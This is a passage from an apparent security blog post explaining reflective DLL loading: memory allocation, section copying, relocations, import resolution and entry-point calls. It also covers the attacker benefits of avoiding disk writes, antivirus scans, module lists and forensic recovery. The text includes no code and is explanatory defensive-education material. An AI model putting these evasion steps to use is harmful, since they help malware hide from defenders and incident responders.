https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=741&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367410&amp;s=0c67d8aa64788718c1d0f10fa68b0249 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367410&amp;s=70e4f437b6136a48ad201dd45c860e77, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=741&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367410&amp;s=d289da94791a4003dd3320567a933acf 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367410&amp;s=f31bf685a5bc0ba317d47adb178b3cb0, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367410&amp;s=09c2858c7f8e813c985ae4019ea73368 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367410&amp;s=b2f0caf8272973a3cec7aa85b57ea5d0, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367410&amp;s=e6917c238e1c936592fa2f50c3c95d43 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig1_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367410&amp;s=b2f0caf8272973a3cec7aa85b57ea5d0" loading="lazy" x-data="image({mq1024:{width:494,height:1080},mq768:{width:494,height:1080},mq320:{width:494,height:1080},DEFAULT:{width:320,height:700}})" :width="getSize()" :height="getSize('height')" alt="" width="494" height="1080" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 1 - IMAGE_OPTIONAL_HEADERS structure</figcaption></figure></div><p class="MsoNormal">Now that we know the preferred location and the size of the DLL, we will allocate the memory using VirtualAlloc and give it the size, requested permission, and the requested location. VirtualAlloc will attempt to allocate the requested memory location but can return a new address if there is a conflict, i.e., memory is already allocated.</p><p class="MsoNormal">We have the empty buffer with the correct size and privileges, let’s start copying over the contents of the DLL. We cannot just do a simple copy of the entire DLL since we need to adjust the locations of the sections in memory. So, we start by copying the Section Headers (MZ, PE headers) into the beginning of our new memory. Then we copy each section into the new memory with the offset (VirtualAddress) requested in its IMAGE_SECTION_HEADER structure.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367411&amp;s=9907fa33161127b4bc60ab3ae4402556, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=780&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367411&amp;s=04847ffdaf86fba87364fe3c5151a6fb 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367411&amp;s=f84890a91eecc01a0b5e03141381637a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=780&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367411&amp;s=c2bf6c4eb554d0a36e78f10858f5ec04 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367411&amp;s=42d330da4dea137313b3d568ba8ac865, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=780&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367411&amp;s=04847ffdaf86fba87364fe3c5151a6fb 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367411&amp;s=b69d267ab12cea7ea6ffa51a97f508c5, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=780&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367411&amp;s=c2bf6c4eb554d0a36e78f10858f5ec04 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367411&amp;s=6a0f176a1a0c85723199a9cc55777958, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=780&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367411&amp;s=04847ffdaf86fba87364fe3c5151a6fb 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367411&amp;s=1881edb044092d90c74f9e566fecca8d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=780&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367411&amp;s=c2bf6c4eb554d0a36e78f10858f5ec04 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367411&amp;s=845492e26989a187a2a32ce28bdec046, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367411&amp;s=e708fa0e9cd4d2b4048afb8cde54c028 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367411&amp;s=800d277d18f3583b455eb7e009b31be8, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367411&amp;s=5dd00e9fab5965a11eb2c0fd57fd3bc6 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig2_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367411&amp;s=800d277d18f3583b455eb7e009b31be8" loading="lazy" x-data="image({mq1024:{width:520,height:370},mq768:{width:520,height:370},mq320:{width:520,height:370},DEFAULT:{width:320,height:228}})" :width="getSize()" :height="getSize('height')" alt="" width="520" height="370" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 2 - IMAGE_SECTION_HEADER</figcaption></figure></div><p class="MsoNormal">With the sections in place, the two remaining tasks are to Patch the Relocations and to address the Import Table.</p><p class="MsoNormal">Relocations are memory addresses stored in the DLL that refer to objects or items that are needed during execution an example would be Strings. During the creation of the DLL, the offset to these objects is known but the final full memory address is not. Before executions, these memory addresses need to be updated with the actual location in the process memory. Remember that VirtualAlloc attempts to create a memory section at a requested address. The relocations can be handled if we are provided with a different memory address. The DLL contains a table with all the needed relocation addresses. We will then iterate through these entries by adding the new memory location to the offset and overwriting that offset in the binary. We will talk about this more when walking through the code.&nbsp;</p><p class="MsoNormal">The final section that will need to be addressed is the Import Table. The Import Table is used to contain all the needed external libraries that our program is dependent on to run. We will need to verify that each of these libraries is loaded into memory and update the Import Address Table with the address of each of the functions. It’s easier than it sounds and again we will walk through this in the code.</p><p class="MsoNormal">At this point, we are almost ready to use our DLL. The only remaining thing to do is to determine what function we want to call. In most cases, the DLLMain is called. Some malware will hide its functionality in other functions requiring that the calling program determines the offset and then jumps to the obfuscated address. But in most cases, the DLLMain is used. The location of the DLLMain or entrypoint is also available in the IMAGE_OPTIONAL_HEADER shown in Figure 1. We just add the offset to the buffer address, and we are good to go.</p><h2>1.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; What Do the Attackers Gain?</h2><p class="MsoNormal">We discussed what Reflective DLL is, an overview of how to do it, and even hinted at some of the benefits of using this technique. In this section, we will dig deeper into the benefits.</p><p class="MsoNormal">One of the primary benefits of Reflective Loading is the ability to load the DLL from memory and never touch the disk. This is key in evading some anti-virus software detections that scan all files as they are written to disc. Also, this avoids having an Incident Response team identify the DLL and reverse engineer it after the fact.</p><p class="MsoNormal">Another form of anti-forensics is downloading the DLL from a remote source. By downloading the DLL directly into memory, it makes it difficult for the defenders to gain access to the DLL. The defenders will either need to capture all traffic across the network and do SSL stripping or after the fact reach out to online resources to download a copy.&nbsp; However, most of the time, the online resources are removed within days if not hours.&nbsp; Hosting the resources online also allows the attackers greater flexibility in the features they use. The stager on the target system doesn’t know or care what the DLL does, it just downloads it and executes it. This allows the stager to be generic and burnable while the main code can be updated and changed.</p><p class="MsoNormal">In the previous blog, we discussed DLL Injection. To perform this, we had to load a new DLL into memory using LoadLibrary. This new DLL showed up when looking at the memory and loaded Modules for that process. If you are an experienced defender, you might know just by noticing that one library is out of place in that module list. Reflective Loading bypasses this by not using LoadLibrary and will only show up in the memory layout as an allocated heap, which is very frequent in programs. The only difference is the permission allocated to that section will include Read, Write, and Execute. These permissions can be changed by section to be stealthier, but our example doesn’t. The following image shows the execution of the C program on the left, and on the right is the memory layout for that process. The highlighted line contains our malicious DLL. As you can see it doesn’t stand out as a DLL, but it does have the protection setting to RWX (Read, Write, and Execute).</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367412&amp;s=1023daa4385d3b29b99e7dac987b3611, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=1290&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367412&amp;s=d065324be16ba16f057d7ca38bc8035c 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367412&amp;s=18ab725fc5881a95a5488b5d996d9abe, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=1290&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367412&amp;s=90a2165f99567b41adbbb94e63f89762 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367412&amp;s=442c0d3303a80eb910053c14a946a4e4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=1290&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367412&amp;s=d065324be16ba16f057d7ca38bc8035c 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367412&amp;s=2437004b1a0630d7adc2c4c913bcd568, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=1290&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367412&amp;s=90a2165f99567b41adbbb94e63f89762 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367412&amp;s=00534974a0ca25d7ab5ca3ac33e5d57d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=1077&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367412&amp;s=7ad3aff647e547419b73fb2bd8db68a6 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367412&amp;s=08d1528d8103da7f3991847392b6ac9c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=1077&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367412&amp;s=77a8daaf0ef1cfc503c2339835484710 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367412&amp;s=f60eba01400fac286721039352237223, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367412&amp;s=2aa416deb97cfdbc744103badd36802a 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367412&amp;s=36db07bce23b8a012ec376da34286b00, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367412&amp;s=67124367a392c4256254d33fef577ed9 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig3_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367412&amp;s=36db07bce23b8a012ec376da34286b00" loading="lazy" x-data="image({mq1024:{width:860,height:158},mq768:{width:860,height:158},mq320:{width:718,height:132},DEFAULT:{width:320,height:59}})" :width="getSize()" :height="getSize('height')" alt="" width="860" height="158" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 3 - Memory allocations after the reflective loader executes</figcaption></figure></div><p class="MsoCaption">The next image is of the loaded Modules in the C program. Notice that this only contains the normal libraries.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367413&amp;s=c6dd7975d7d107b79c46fcb9d287d58c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=807&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367413&amp;s=e2c79223a98e31e7dfe6c068c0622c84 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367413&amp;s=7e2472940dc5c007759f48a3bde0fda7, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=807&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367413&amp;s=215184bcbbc6fb56e6749bc31b240d03 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367413&amp;s=87687a0be73b1194d51d3457143930d2, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=807&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367413&amp;s=e2c79223a98e31e7dfe6c068c0622c84 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367413&amp;s=4e736b343b737dd01014499040f54f5b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=807&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367413&amp;s=215184bcbbc6fb56e6749bc31b240d03 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367413&amp;s=0bee6204d5074af05c5e5eacdf0d9004, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=807&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367413&amp;s=e2c79223a98e31e7dfe6c068c0622c84 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367413&amp;s=900612b43faee31ac7c5c73e8f6857a3, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=807&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367413&amp;s=215184bcbbc6fb56e6749bc31b240d03 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367413&amp;s=7ed56fcad8f0b799e197053495f780e8, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367413&amp;s=0fcdd0f9fc3f855741443ab0af555be9 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367413&amp;s=f79d92ef58a4a90ae8d6d1cf63b4531b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367413&amp;s=b8479f733a3119b886a627239a30292a 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig4_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367413&amp;s=f79d92ef58a4a90ae8d6d1cf63b4531b" loading="lazy" x-data="image({mq1024:{width:538,height:432},mq768:{width:538,height:432},mq320:{width:538,height:432},DEFAULT:{width:320,height:257}})" :width="getSize()" :height="getSize('height')" alt="" width="538" height="432" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 4 - Process Modules</figcaption></figure></div><p class="MsoNormal">The following image illustrates the execution of the malicious DLL, which spawns a calculator. In the console under the calculator, the output shows the memory address that was returned by the VirtualAlloc and which holds the DLL. The right shows the memory layout of the C# process.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367414&amp;s=d5789b651f61c9aff266863f8118bcb6, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367414&amp;s=c959d9352a38a5449b8774b4259a10fb 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367414&amp;s=5766cb305f226960fc0bc1e5fb390dcb, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367414&amp;s=6bcc87a4b8b921eabb8db8cd4fb36f32 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367414&amp;s=6c49a7ebe940aba140b6ac0ebc4f9dfb, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367414&amp;s=c959d9352a38a5449b8774b4259a10fb 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367414&amp;s=2c1e337ed59462af5dc027a70bc5c305, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367414&amp;s=6bcc87a4b8b921eabb8db8cd4fb36f32 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367414&amp;s=4c724a21e9826ed8c20ea2a587018a57, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367414&amp;s=6544bf0e77c34340372aeefe0659a382 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367414&amp;s=6399c4a23aa1dd8841d5a6b4260af63b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367414&amp;s=971db40716839338bd5b112b328dfab7 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367414&amp;s=51cc87060c936a8f33b525ef1e0b033e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367414&amp;s=1580a7a2a9c999944a6b4a2a0cd52719 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367414&amp;s=aca58e531ff30758042f0e1e15aad58b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367414&amp;s=4b3b2312b8061465f21ea27b2c61ab6a 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig5_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367414&amp;s=aca58e531ff30758042f0e1e15aad58b" loading="lazy" x-data="image({mq1024:{width:936,height:456},mq768:{width:936,height:456},mq320:{width:720,height:351},DEFAULT:{width:320,height:156}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="456" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 5 - C# Memory Layout After Reflective Loader Execution</figcaption></figure></div><p class="MsoNormal">The next image shows the loaded Modules for the C# program. This is a .Net program, so it will contain a larger number of DLLs compared to the C version, but it also doesn’t contain the malicious DLLs name.</p><div class="my-p56 flex justify-start"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367415&amp;s=c3f225b74a8875f0c4776c6fa062473c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=813&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367415&amp;s=c6de6d21ebe5df46a3edafc70eb080f6 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367415&amp;s=e7b99b2d92cdf6e9f069bb95b09e0277, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=813&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367415&amp;s=cd32a3196be48e9f1c84cbb38c814fe7 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367415&amp;s=a2edefc1aef39c57823fbc8fb6b20960, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=813&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367415&amp;s=c6de6d21ebe5df46a3edafc70eb080f6 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367415&amp;s=9eea5575f204602e1f51f84d22f9592d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=813&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367415&amp;s=cd32a3196be48e9f1c84cbb38c814fe7 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig6a_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367415&amp;s=29d85a958a45682927e3fa3a2e9a5b70, 